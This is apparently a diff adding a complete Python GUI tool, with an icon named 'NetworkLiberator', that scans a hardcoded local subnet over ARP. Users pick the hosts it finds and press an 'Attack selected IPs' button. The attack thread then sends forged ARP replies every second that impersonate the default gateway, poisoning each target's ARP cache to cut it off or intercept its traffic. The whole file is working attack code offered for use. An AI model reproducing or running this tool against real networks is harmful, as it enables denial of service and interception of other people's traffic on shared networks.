@@ -1,0 +1,192 @@
+#!/usr/bin/env python3
+import sys, time, socket, struct, manuf, os
+from scapy.all import *
+from tkinter import *
+from threading import Thread
+
+def get_default_gateway_linux():
+    """Read the default gateway directly from /proc."""
+    with open("/proc/net/route") as fh:
+        for line in fh:
+            fields = line.strip().split()
+            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
+                continue
+            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
+
+class Attack(Thread):
+    """Thread in charge of attacking a given IP with ARP packet"""
+
+    def __init__(self, targetIpList, gatewayIp):
+        Thread.__init__(self)
+        self.targetIpList = targetIpList
+        self.gatewayIp = gatewayIp
+
+    def run(self):
+        global glob_attack_on_going
+        packetList = []
+        k = 0
+        for i in self.targetIpList:
+            packetList.append(ARP())
+            packetList[k].op = 2
+            packetList[k].psrc = self.gatewayIp
+            packetList[k].pdst = i
+            packetList[k].hwdst = get_mac(i, 0.05)
+            k += 1
+        while glob_attack_on_going:
+            send(packetList)
+            time.sleep(1)
+        print("Attack stopped !")
+
+class ScannerIP(Thread):
+    """Class for threading the scan of the network"""
+    def __init__(self):
+        Thread.__init__(self)
+        """self.Frame2 = Frame2
+        self.glob_list_ip = glob_list_ip
+        self.glob_ipListButton
+        self.window = window"""
+
+    def cleanButtonList(self, buttonList):
+        for i in buttonList:
+            i.destroy()
+
+    def run(self):
+        global glob_list_ip, glob_ipListButton, Frame2, window, scanRunning, refreshButton
+        glob_list_ip = []
+        self.cleanButtonList(glob_ipListButton)
+        glob_ipListButton = []
+        k = 0
+        timeout = 0.04
+
+        window.update()
+        for i in range(255):
+            if (scanRunning == 0):
+                return (0)
+            print("<<<<"+str(i)+">>>>")
+            strIP = base_address + str(i)
+            if get_mac(strIP, timeout) is not None:
+                glob_list_ip.append([])
+                glob_list_ip[k] = [strIP, IntVar()]
+                vendor = manuf.MacParser()
+                try:
+                    vendorName = vendor.get_comment(get_mac(strIP, timeout))
+                    if vendorName is None:
+                        vendorName = "Unknown"
+                except :
+                    vendorName = "Unknown"
+                text = strIP +" -> "+vendorName
+                glob_ipListButton.append(Checkbutton(Frame2, text=text, variable=glob_list_ip[k][1]))
+                glob_ipListButton[k].config(height = 1, width = 40)
+                glob_ipListButton[k].pack()
+                window.update()
+                k += 1
+        refreshButton["text"] = "Scan the network"
+        refreshButton.configure(bg="grey")
+        scanRunning = 0
+
+glob_list_ip = []
+glob_ipListButton = []
+glob_attack_on_going = 0
+default_gateway = ""
+scanRunning = 0
+
+#------ Button Functions at the top -----
+def scanNetwork():
+    global scanRunning, refreshButton, window
+    if (scanRunning == 0):
+        scanRunning = 1
+        refreshButton["text"] = "Stop scanning"
+        refreshButton.configure(bg="red")
+        refreshButton.pack()
+        window.update()
+        scanThread = ScannerIP()
+        scanThread.start()
+    else:
+        scanRunning = 0
+        refreshButton["text"] = "Scan the network"
+        refreshButton.configure(bg="white")
+
+
+def selectAll():
+    global glob_list_ip
+    global window, selectAllButton
+
+    if (selectAllButton.set == 0):
+        for i in glob_list_ip:
+            i[1].set(1)
+        selectAllButton.set = 1
+        selectAllButton["text"]= "Unselect all IPs"
+    else:
+        for i in glob_list_ip:
+            i[1].set(0)
+        selectAllButton.set = 0
+        selectAllButton["text"] = "Select all IPs"
+
+def attackThisIPList(targetIpList, gatewayIp):
+    attack_thread = Attack(targetIpList, gatewayIp)
+    attack_thread.start()
+
+def globalAttack():
+    global default_gateway
+    global glob_list_ip
+    global glob_ipListButton
+    global window, attackButton, glob_attack_on_going
+
+    if (attackButton.set == 0):
+        glob_attack_on_going = 1
+        targetIpList = []
+        for ip in glob_list_ip:
+            if ip[1].get():
+                print("Attack on "+ip[0]+" with gateway "+default_gateway)
+                attackButton.set = 1
+                targetIpList.append(ip[0])
+        if (len(targetIpList) > 0):
+            attackThisIPList(targetIpList, default_gateway)
+            attackButton["text"] = "Stop attack"
+        else:
+            glob_attack_on_going = 0
+    else:
+        glob_attack_on_going = 0
+        attackButton.set = 0
+        attackButton["text"] = "Attack selected IPs"
+#-------------- End Button Functions --------------------
+
+
+def get_mac(ip_address, timeout):
+    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=timeout,retry=2)
+    for s,r in responses:
+        return r[Ether].src
+    return None
+
+
+base_address = "192.168.100."
+
+default_gateway = get_default_gateway_linux()
+print("default_gateway is "+default_gateway)
+
+window = Tk()
+program_directory=sys.path[0]
+window.iconphoto(True, PhotoImage(file=os.path.join(program_directory, "NetworkLiberatorIcon.png")))
+#window.iconbitmap("@NetworkLiberatorIcon.xbm")
+
+# TopBar
+Frame1 = Frame(window, borderwidth=4, width=400, relief=GROOVE)
+Frame1.pack(side=TOP, padx=20, pady=10)
+refreshButton=Button(Frame1, text="Scan the network", command=scanNetwork)
+refreshButton.set = 0
+refreshButton.config(height = 1, width = 26)
+refreshButton.pack()
+selectAllButton=Button(Frame1, text="Select all IPs", command=selectAll)
+selectAllButton.set = 0
+selectAllButton.config(height = 1, width = 26)
+selectAllButton.pack()
+attackButton = Button(Frame1, text="Attack selected IPs", command=globalAttack)
+attackButton.set = 0
+attackButton.config(height = 1, width = 26)
+attackButton.pack()
+
+
+# IPList
+Frame2 = Frame(window, borderwidth=2, width=200, relief=GROOVE)
+Frame2.pack(side=LEFT, padx=0, pady=5)
+window.mainloop()
